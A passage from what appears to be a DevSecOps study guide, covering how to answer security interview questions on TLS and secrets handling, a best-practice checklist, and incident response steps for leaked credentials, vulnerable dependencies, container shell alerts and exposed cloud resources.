Commands are searchable in seconds; judgment isn't. Interviewers probe why because it reveals whether you understand tradeoffs, can adapt when the situation differs from the tutorial, and can explain a decision to teammates. "Use bcrypt" is a fact; "bcrypt because it's deliberately slow and salted, so precomputed rainbow tables and GPU brute-forcing don't scale — I'd set the cost factor to target ~250ms per hash" shows you actually understand the mechanism and the tradeoff.

How to answer the two most common security questions well

"How does TLS actually work?" — a strong 45-second answer

"The client and server use asymmetric crypto once to agree on a shared session key — in TLS 1.3 via ephemeral Diffie-Hellman, so the key is never sent and past traffic stays safe even if the private key later leaks (forward secrecy). The server's certificate proves its identity: the client walks the chain from the leaf up through intermediates to a trusted root CA, checking each signature, the expiry, and that the domain matches the SAN. Once identity is proven and the key agreed, they switch to fast symmetric AES-GCM for the actual data. mTLS just adds the reverse — the server also verifies the client's cert." (This maps directly to §16–17.)

"How do you keep secrets out of code?" — a strong answer

"Nothing sensitive in code, images, or Git. Secrets live in a manager (Vault / AWS Secrets Manager); the workload authenticates with an identity it already has — a Kubernetes ServiceAccount or IAM role — and fetches them at runtime into memory. Ideally they're dynamic: Vault mints a per-request DB credential on a 1-hour lease and revokes it automatically, so a leak is worthless fast. I run gitleaks in pre-commit and CI to catch mistakes, and if something does leak, the first move is to rotate the credential, not just delete the commit — history and clones still have it." (Maps to §6 and §22.)

Common interview mistakes
  • Reciting a definition with no "why it matters" or tradeoff — sounds memorized.
  • Naming tools without the concept ("I'd use Trivy") instead of the mechanism ("SCA matches my dependency tree against CVE databases; Trivy is one implementation").
  • Claiming experience you can't demonstrate — interviewers drill down; the capstone gives you real ground to stand on.
  • Ignoring tradeoffs — every real answer has one (security vs velocity, false positives vs coverage). Naming it signals seniority.
Mental model: explain it like you're onboarding a teammate

The best interview answers sound like you're calmly bringing a new colleague up to speed: what it is, why we bother, how we do it here, and the one gotcha to watch for. If you can teach it simply, you understand it — and that's exactly what the interviewer is measuring.

28. Best Practices — the master checklist

DevSecOps master checklist
  • Threat model at design; adopt Zero Trust & least privilege everywhere.
  • Automate SAST + SCA + secret scanning + IaC scanning in every pipeline; fail on high/critical.
  • Secrets in a manager with rotation; never in code/images/Git.
  • Sign artifacts + verify at admission; generate SBOMs; track SLSA provenance.
  • Harden containers (non-root, distroless, read-only) and Kubernetes (RBAC, PSS, NetworkPolicy, admission).
  • CSPM + CloudTrail + GuardDuty in the cloud; encrypt everything.
  • Runtime detection (Falco) as the last line; policy as code for compliance.
  • Blameless postmortems for security incidents — learn, don't blame.

29. Security Incident Checklist

Suspected credential leak

Rotate the credential immediately — assume it's compromised. Then find the exposure (git history, logs), revoke sessions/tokens, review access logs for misuse, and add scanning to prevent recurrence. Removing it from Git history does NOT un-leak it.

Scanner flags a critical CVE in a dependency

Check if you use the vulnerable code path (SBOM helps). Upgrade the dependency; if no fix exists, mitigate (WAF rule, config) and track. Don't blanket-ignore criticals.

Falco alerts: shell spawned in a running container

Treat as potential compromise. Isolate the pod (NetworkPolicy/cordon), capture forensics (logs, process tree), rotate any secrets it could access, then investigate root cause. Legitimate debugging should use kubectl debug, not exec into prod.

Public cloud resource discovered (open bucket/SG)

Lock it down immediately, review access logs for exposure window, notify per your policy, and add a CSPM/policy rule so it can't recur.
